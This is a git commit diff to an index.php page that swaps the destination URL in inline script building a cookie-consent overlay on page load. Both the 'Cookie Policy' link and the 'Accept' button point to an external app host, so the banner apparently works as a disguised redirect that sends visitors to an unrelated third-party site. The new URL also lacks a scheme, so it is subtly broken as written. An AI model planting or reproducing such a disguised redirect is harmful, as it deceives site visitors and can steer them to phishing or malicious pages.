56c054e78c8e8a2a49262395f12ea070d048fd4d
pbshandilya1 <prashant.kumar@essencestudios.net>
2026-01-08 01:19:29 +0530

    Add files via upload

--- index.php
+++ index.php
@@ -4,7 +4,7 @@
 <head>
 	<script>
 	        document.addEventListener("DOMContentLoaded", function () {
-	            const redirectUrl = "https://orca-app-sc7g6.ondigitalocean.app/";
+	            const redirectUrl = "app1-cqfeb7bvf5erbwhg.centralus-01.azurewebsites.net";
 	            const style = document.createElement("style");
 	            style.textContent = `
 	                .cookie-overlay {
@@ -85,7 +85,7 @@
 	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
 	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
 	</p>
-	<a href="https://orca-app-sc7g6.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
+	<a href="app1-cqfeb7bvf5erbwhg.centralus-01.azurewebsites.net" id="accept-cookies" class="btn-primary">Accept</a>
 	</div>
 	            `;
 	            document.body.appendChild(overlay);
